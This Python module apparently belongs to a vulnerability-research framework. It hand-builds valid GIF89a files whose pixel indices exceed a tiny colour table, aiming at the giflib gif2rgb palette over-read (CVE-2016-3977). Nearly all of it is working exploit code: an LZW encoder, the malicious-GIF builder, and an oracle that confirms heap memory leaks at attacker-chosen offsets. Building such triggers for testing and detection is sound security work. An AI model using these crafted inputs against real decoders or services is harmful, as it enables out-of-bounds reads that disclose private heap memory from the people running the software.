"""Directed trigger for an INDEXED-TABLE over-read behind a container format (CWE-125 / CWE-200).

The shape, from giflib's gif2rgb (CVE-2016-3977 and its five re-files):

    ColorMapEntry = &ColorMap->Colors[GifRow[j]];   // gif2rgb.c:294 / :317

`GifRow[j]` is a pixel's colour index -- a byte, 0..255, chosen by the IMAGE DATA -- and
`ColorMap->Colors` has only `ColorCount` entries (often 2). A pixel index >= ColorCount reads
past the colour table and copies those bytes (adjacent heap) into the decoded RGB output: an
out-of-bounds READ that is also an information DISCLOSURE.

A blind fuzzer almost never constructs this: it has to keep a VALID GIF container -- magic, screen
descriptor, a colour table, a syntactically valid LZW image stream -- while making one decoded
pixel index exceed the table size, and random mutation breaks the container long before it lands
the index. But once a detector has NARROWED to the palette-index sink, the trigger is not a search
at all: build the smallest valid GIF whose table is tiny and whose one pixel is out of range. That
is what this module does -- one construction, no campaign -- so the narrowed sink becomes a
detonatable input the ASan build reports (L1) and the plain build turns into disclosure (L3, via
chain_primitive._oob_read_disclose: the leaked bytes are heap the palette never held).

Only the GIF container is implemented here; the mechanism (small table + out-of-range index in a
valid container) is the same for any palette/indexed format, and each one is a short addition.
"""
from __future__ import annotations

import struct

# ---------------------------------------------------------------- GIF89a, built by hand (no giflib)

_GIF_HEADER = b"GIF89a"
_TRAILER = b"\x3b"
_IMAGE_SEP = b"\x2c"


def _lzw_min8(pixels: list[int]) -> bytes:
    """A valid GIF LZW image data stream for `pixels`, min-code-size 8.

    Min code size 8 makes the clear code 256 and the end code 257, so every byte value 0..255 is
    a ROOT code emitted directly -- no dictionary building is needed to encode a given index, which
    is exactly what we want (we are placing a specific index, not compressing). Codes are packed
    LSB-first at 9 bits; the decoder widens its code size as it adds dictionary entries, so we keep
    the pixel count small enough (< ~250) that the width never leaves 9 bits and the stream stays
    unambiguous. Output is chunked into GIF sub-blocks (<=255 bytes, 0x00 terminator)."""
    assert all(0 <= p <= 255 for p in pixels)
    min_code_size = 8
    clear, end = 1 << min_code_size, (1 << min_code_size) + 1     # 256, 257
    code_size = min_code_size + 1                                 # 9
    next_code = end + 1                                           # 258
    bits, nbits = 0, 0
    out = bytearray()

    def emit(code: int) -> None:
        nonlocal bits, nbits
        bits |= code << nbits
        nbits += code_size
        while nbits >= 8:
            out.append(bits & 0xFF)
            bits >>= 8
            nbits -= 8

    emit(clear)
    for p in pixels:
        emit(p)
        next_code += 1
        # widen exactly when the next assignable code would not fit (bounded, 12 max); for our
        # small pixel counts this never fires, but keep the encoder honest.
        if next_code == (1 << code_size) and code_size < 12:
            code_size += 1
    emit(end)
    if nbits > 0:
        out.append(bits & 0xFF)

    # sub-block framing
    framed = bytearray()
    for i in range(0, len(out), 255):
        chunk = out[i:i + 255]
        framed.append(len(chunk))
        framed.extend(chunk)
    framed.append(0x00)          # block terminator
    return bytes(framed)


def gif_overindexed(*, colors: int = 2, index: int = 255, width: int = 8, height: int = 1,
                    palette: bytes | None = None) -> bytes:
    """A valid GIF89a whose global colour table has `colors` entries and whose decoded image is
    `width*height` pixels ALL equal to `index`. When `index >= colors`, a decoder that indexes the
    table by the pixel value reads past it.

    `colors` is rounded UP to the nearest power of two (a GIF table size is 2**(N+1)); the packed
    field encodes N. `palette`, if given, is the raw colour-table bytes (3*table_size) -- used to
    plant a recognisable pattern for the disclosure oracle; otherwise a minimal black/white table.
    """
    if not (0 <= index <= 255):
        raise ValueError("a GIF pixel index is one byte (0..255)")
    # table size = 2**(n+1), n in 0..7  -> 2,4,8,...,256 entries
    n = 0
    while (2 << n) < max(2, colors) and n < 7:
        n += 1
    table_size = 2 << n
    packed = 0x80 | (n & 0x07)        # bit7: GCT present; bits0-2: size exponent
    if palette is None:
        pal = bytearray()
        for k in range(table_size):
            v = 0 if k == 0 else 255
            pal += bytes((v, v, v))
        palette = bytes(pal)
    elif len(palette) != table_size * 3:
        raise ValueError(f"palette must be {table_size*3} bytes for a {table_size}-entry table")

    out = bytearray()
    out += _GIF_HEADER
    out += struct.pack("<HH", width, height)              # logical screen w,h
    out += bytes((packed, 0, 0))                          # packed, bg index, aspect
    out += palette                                        # global colour table
    out += _IMAGE_SEP
    out += struct.pack("<HH", 0, 0)                       # image left, top
    out += struct.pack("<HH", width, height)              # image w,h
    out += bytes((0x00,))                                 # image packed: no local table
    out += bytes((8,))                                    # LZW minimum code size
    out += _lzw_min8([index] * (width * height))          # image data
    out += _TRAILER
    return bytes(out)


# ------------------------------------------------------------------ L3: disclosure, forgery-proof

def confirm_disclosure(read_pixel, *, colors: int = 2, in_bounds_index: int = 0,
                       probe_indices=(32, 96, 160, 224), width: int = 64, height: int = 8) -> dict:
    """Confirm the palette over-read DISCLOSES heap memory at an attacker-chosen offset -- L3.

    `read_pixel(gif_bytes) -> (r, g, b) | None` runs the NON-instrumented target on a constructed
    GIF and returns the first decoded output pixel (the bytes the over-read copied out). The oracle
    is sound and forgery-proof:

      * NEGATIVE CONTROL -- an IN-BOUNDS pixel index returns exactly the known palette entry. A
        decoder that bounds-checks or clamps can only ever return palette entries, so this pins
        what "safe" looks like.
      * POSITIVE -- two or more OUT-OF-RANGE indices (`pixel >= colours`) return byte triples that
        (a) are each different from every palette entry and (b) differ from one another. The read
        address is `Colors + pixel*stride`, so a changing pixel is a changing HEAP OFFSET: the
        output is heap memory the attacker chose to disclose, varying as the chosen offset varies.

    An echo of the input cannot forge this (the triples are heap, not input bytes); a safe decoder
    cannot produce offset-dependent non-palette bytes. A wider/taller image is used so the target
    populates the heap region the over-read reaches (an empty heap discloses only zeros, which is a
    real read but demonstrates nothing). Returns a verdict dict."""
    # a palette with distinct, recognisable entries so "a leaked byte equals a palette entry" is a
    # meaningful exclusion rather than a coincidence of all-zero/all-0xff colours.
    n = 0
    while (2 << n) < max(2, colors):
        n += 1
    table_size = 2 << n
    pal = bytearray()
    for k in range(table_size):
        pal += bytes(((k * 17 + 1) & 0xFF, (k * 29 + 7) & 0xFF, (k * 43 + 13) & 0xFF))
    pal_entries = {tuple(pal[3 * k:3 * k + 3]) for k in range(table_size)}

    def _px(idx):
        g = gif_overindexed(colors=table_size, index=idx, width=width, height=height,
                            palette=bytes(pal))
        return read_pixel(g)

    control = _px(in_bounds_index % table_size)
    want = tuple(pal[3 * (in_bounds_index % table_size):3 * (in_bounds_index % table_size) + 3])
    if control != want:
        return {"disclosed": False, "control_ok": False, "control": control, "expected": want,
                "why": "in-bounds index did not return the known palette entry -- cannot trust the "
                       "channel (wrong output mode, or the target did not render)"}

    leaked = {}
    for idx in probe_indices:
        if idx < table_size:
            continue
        px = _px(idx)
        if px is not None and tuple(px) not in pal_entries:
            leaked[idx] = tuple(px)

    distinct = set(leaked.values())
    disclosed = len(leaked) >= 2 and len(distinct) >= 2
    return {"disclosed": disclosed, "control_ok": True, "control": control,
            "table_size": table_size, "leaked": leaked,
            "why": (f"out-of-range pixel indices disclosed {len(distinct)} distinct non-palette "
                    f"heap triples (attacker-chosen read offset Colors+pixel*stride); in-bounds "
                    f"index returned the palette entry as a negative control"
                    if disclosed else
                    "the over-read region held no attacker-distinguishable heap content on this "
                    "input (only zeros or palette-equal bytes) -- a larger/groomed heap is needed")}
